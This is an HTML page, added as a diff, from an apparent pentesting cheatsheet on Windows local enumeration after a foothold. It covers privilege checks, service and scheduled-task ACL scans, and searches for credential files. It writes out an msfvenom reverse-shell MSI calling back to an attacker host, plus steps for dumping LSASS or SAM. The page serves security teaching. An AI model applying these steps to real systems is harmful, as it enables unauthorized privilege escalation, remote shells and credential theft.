@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Local Enum | JinPwn</title><meta name="description" content="First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">
+<meta property="og:title" content="Local Enum | JinPwn">
+<meta property="og:description" content="First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Local Enum | JinPwn">
+<meta name="twitter:description" content="First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Local Enum | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w02-local-enum/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Windows Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/windows/" class="cheatsheet-sidebar-section">Windows Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-sidebar-link">Windows MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-sidebar-link">Recon &amp; Enum</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-sidebar-link is-current">Local Enum</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-sidebar-link">PrivEsc - Tokens &amp; Privileges</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-sidebar-link">PrivEsc - Services &amp; Registry</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-sidebar-link">PrivEsc - DLL &amp; Unquoted Paths</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-sidebar-link">PrivEsc - Credentials &amp; Files</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-sidebar-link">UAC Bypass</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-sidebar-link">PrivEsc - Kernel &amp; Exploits</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-sidebar-link">LOLBAS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-sidebar-link">Defender &amp; AMSI Evasion</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Local Enum</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Local Enum</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Windows Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/windows/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-mobile-sections-link">Windows MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-mobile-sections-link">Recon &amp; Enum</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-mobile-sections-link is-current">Local Enum</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-mobile-sections-link">PrivEsc - Tokens &amp; Privileges</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-mobile-sections-link">PrivEsc - Services &amp; Registry</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-mobile-sections-link">PrivEsc - DLL &amp; Unquoted Paths</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-mobile-sections-link">PrivEsc - Credentials &amp; Files</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-mobile-sections-link">UAC Bypass</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-mobile-sections-link">PrivEsc - Kernel &amp; Exploits</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-mobile-sections-link">LOLBAS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-mobile-sections-link">Defender &amp; AMSI Evasion</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>First moves after foothold on Windows. Same idea as Linux <a href="https://jinpwn.dev/cheatsheets/linux-pentesting/05-local-enum/">Local Enum</a>
+ but different commands. AD-joined hosts also need <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">AD MOC</a>
+ enum.</p>
+<h2 id="i-the-first-60-seconds" data-heading-permalink="true"><span class="heading-content">i. The first 60 seconds</span>
+    <a class="heading-permalink" href="#i-the-first-60-seconds" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl"><span class="n">hostname</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.Environment</span><span class="p">]::</span><span class="n">OSVersion</span><span class="p">.</span><span class="py">Version</span>
+</span></span><span class="line"><span class="cl"><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">B</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS Name&#34;</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS Version&#34;</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;System Type&#34;</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;Domain&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$env:USERDOMAIN</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$env:LOGONSERVER</span>
+</span></span></code></pre></div><p>What to look at:</p>
+<ul>
+<li><code>whoami /priv</code> -&gt; any <code>Enabled</code> privilege that maps to GodPotato / SeBackup etc, see <a href="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">PrivEsc - Tokens &amp; Privileges</a>
+</li>
+<li><code>whoami /groups</code> -&gt; Administrators, Backup Operators, DnsAdmins, Hyper-V Admins all = high-value</li>
+<li><code>systeminfo</code> Domain field -&gt; joined to AD, see <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">AD MOC</a>
+</li>
+</ul>
+<h2 id="ii-users-and-groups" data-heading-permalink="true"><span class="heading-content">ii. Users and groups</span>
+    <a class="heading-permalink" href="#ii-users-and-groups" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user
+</span></span><span class="line"><span class="cl">net user Administrator
+</span></span><span class="line"><span class="cl">net localgroup
+</span></span><span class="line"><span class="cl">net localgroup Administrators
+</span></span><span class="line"><span class="cl">net accounts                                ## password policy
+</span></span></code></pre></div><p>PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-LocalUser</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-LocalGroup</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-LocalGroupMember</span> <span class="n">Administrators</span>
+</span></span></code></pre></div><p>Logged-in users right now:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">query user
+</span></span><span class="line"><span class="cl">qwinsta
+</span></span><span class="line"><span class="cl">quser
+</span></span></code></pre></div><h2 id="iii-processes-and-network-state" data-heading-permalink="true"><span class="heading-content">iii. Processes and network state</span>
+    <a class="heading-permalink" href="#iii-processes-and-network-state" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">tasklist /v /fo list
+</span></span><span class="line"><span class="cl">tasklist /svc
+</span></span><span class="line"><span class="cl">netstat -anob
+</span></span></code></pre></div><p>PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Id</span><span class="p">,</span><span class="n">ProcessName</span><span class="p">,</span><span class="vm">@</span><span class="p">{</span><span class="n">N</span><span class="p">=</span><span class="s1">&#39;User&#39;</span><span class="p">;</span><span class="n">E</span><span class="p">={(</span><span class="nb">Get-Process</span> <span class="n">-Id</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Id</span> <span class="n">-IncludeUserName</span><span class="p">).</span><span class="n">UserName</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetTCPConnection</span> <span class="n">-State</span> <span class="n">Listen</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">LocalAddress</span><span class="p">,</span><span class="n">LocalPort</span><span class="p">,</span><span class="n">OwningProcess</span>
+</span></span></code></pre></div><p>Look for:</p>
+<ul>
+<li>Processes running as <code>NT AUTHORITY\SYSTEM</code> you can interact with</li>
+<li>Listening ports on 127.0.0.1 (internal services)</li>
+<li>Tasks containing creds in command line (<code>tasklist /v</code> shows full cmdline)</li>
+</ul>
+<h2 id="iv-network-and-routing" data-heading-permalink="true"><span class="heading-content">iv. Network and routing</span>
+    <a class="heading-permalink" href="#iv-network-and-routing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ipconfig /all
+</span></span><span class="line"><span class="cl">route print
+</span></span><span class="line"><span class="cl">arp -a
+</span></span></code></pre></div><p>PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-NetIPConfiguration</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetIPAddress</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DnsClientServerAddress</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetRoute</span>
+</span></span></code></pre></div><p>Look for extra interfaces (Hyper-V switches, VPN tunnels, second NIC -&gt; separate networks for <a href="https://jinpwn.dev/cheatsheets/linux-pentesting/12-pivoting/">Pivoting</a>
+).</p>
+<h2 id="v-privileges-and-tokens" data-heading-permalink="true"><span class="heading-content">v. Privileges and tokens</span>
+    <a class="heading-permalink" href="#v-privileges-and-tokens" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>This is the most important single check on Windows. Full table in <a href="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">PrivEsc - Tokens &amp; Privileges</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">whoami /priv
+</span></span></code></pre></div><p>Privileges that mean privesc:</p>
+<ul>
+<li><code>SeImpersonatePrivilege</code> -&gt; Potato attack</li>
+<li><code>SeAssignPrimaryTokenPrivilege</code> -&gt; Potato attack</li>
+<li><code>SeBackupPrivilege</code> -&gt; dump SAM/SYSTEM</li>
+<li><code>SeRestorePrivilege</code> -&gt; write any file</li>
+<li><code>SeDebugPrivilege</code> -&gt; dump LSASS</li>
+<li><code>SeLoadDriverPrivilege</code> -&gt; driver tricks</li>
+<li><code>SeTakeOwnershipPrivilege</code> -&gt; own any file</li>
+<li><code>SeManageVolumePrivilege</code> -&gt; volume control = file access</li>
+<li><code>SeTcbPrivilege</code> -&gt; &ldquo;act as part of OS&rdquo;, basically SYSTEM</li>
+</ul>
+<h2 id="vi-alwaysinstallelevated" data-heading-permalink="true"><span class="heading-content">vi. AlwaysInstallElevated</span>
+    <a class="heading-permalink" href="#vi-alwaysinstallelevated" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>A misconfig that runs MSI installers as SYSTEM. Check both hives:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span class="line"><span class="cl">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span></code></pre></div><p>Both must be 1 for it to work. If yes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## On attacker</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f msi -o sh.msi
+</span></span><span class="line"><span class="cl"><span class="c1">## On target</span>
+</span></span><span class="line"><span class="cl">msiexec /quiet /qn /i C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>h.msi
+</span></span></code></pre></div><h2 id="vii-service-enum" data-heading-permalink="true"><span class="heading-content">vii. Service enum</span>
+    <a class="heading-permalink" href="#vii-service-enum" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Service-based privesc surface in <a href="https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/">PrivEsc - Services &amp; Registry</a>
+. First-pass enum:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">Status</span> <span class="o">-eq</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">StartMode</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">StartName</span><span class="p">,</span><span class="n">PathName</span>
+</span></span></code></pre></div><p>Service binary writable check (privesc indicator):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="py">PathName</span> <span class="o">-replace</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span> <span class="n">-split</span> <span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">-and</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$p</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="nv">$p</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="py">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">IdentityReference</span> <span class="o">-match</span> <span class="nv">$env:USERNAME</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write|FullControl&#39;</span><span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;WRITABLE: </span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> -&gt; </span><span class="nv">$p</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Unquoted service paths:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic service get name,displayname,pathname,startmode <span class="p">|</span> findstr /i <span class="s2">&#34;auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;c:\windows\\&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><h2 id="viii-scheduled-tasks" data-heading-permalink="true"><span class="heading-content">viii. Scheduled tasks</span>
+    <a class="heading-permalink" href="#viii-scheduled-tasks" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">schtasks /query /fo LIST /v
+</span></span></code></pre></div><p>PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">State</span> <span class="o">-ne</span> <span class="s1">&#39;Disabled&#39;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">TaskName</span><span class="p">,</span><span class="n">TaskPath</span><span class="p">,</span><span class="n">Author</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Tasks running as elevated user that you can modify:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$p</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Principal</span><span class="p">.</span><span class="py">UserId</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">-match</span> <span class="s1">&#39;SYSTEM|Administrator&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_</span><span class="p">.</span><span class="py">Actions</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$exe</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Execute</span> <span class="o">-replace</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$exe</span> <span class="o">-and</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$exe</span><span class="p">)</span> <span class="o">-and</span> <span class="p">((</span><span class="nb">Get-Acl</span> <span class="nv">$exe</span><span class="p">).</span><span class="py">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write&#39;</span><span class="p">}))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WRITABLE TASK: </span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskName</span><span class="p">)</span><span class="s2"> -&gt; </span><span class="nv">$exe</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="ix-installed-software-and-patch-level" data-heading-permalink="true"><span class="heading-content">ix. Installed software and patch level</span>
+    <a class="heading-permalink" href="#ix-installed-software-and-patch-level" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic product get name,version
+</span></span><span class="line"><span class="cl">wmic qfe list brief
+</span></span><span class="line"><span class="cl">systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS Name&#34;</span> /C:<span class="s2">&#34;OS Version&#34;</span> /C:<span class="s2">&#34;KB&#34;</span>
+</span></span></code></pre></div><p>PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_QuickFixEngineering</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="err">:</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Wow6432Node</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Uninstall</span><span class="p">\*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span><span class="n">DisplayVersion</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="err">:</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Uninstall</span><span class="p">\*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span><span class="n">DisplayVersion</span>
+</span></span></code></pre></div><p>Feed <code>systeminfo</code> output to Windows-Exploit-Suggester for kernel exploit candidates, see <a href="https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/">PrivEsc - Kernel &amp; Exploits</a>
+.</p>
+<h2 id="x-files-of-interest" data-heading-permalink="true"><span class="heading-content">x. Files of interest</span>
+    <a class="heading-permalink" href="#x-files-of-interest" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Files that often have creds:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Users\*unattend.xml <span class="mi">2</span><span class="p">&gt;</span>nul
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\unattend.xml <span class="mi">2</span><span class="p">&gt;</span>nul
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Windows\Panther\Unattend.xml <span class="mi">2</span><span class="p">&gt;</span>nul
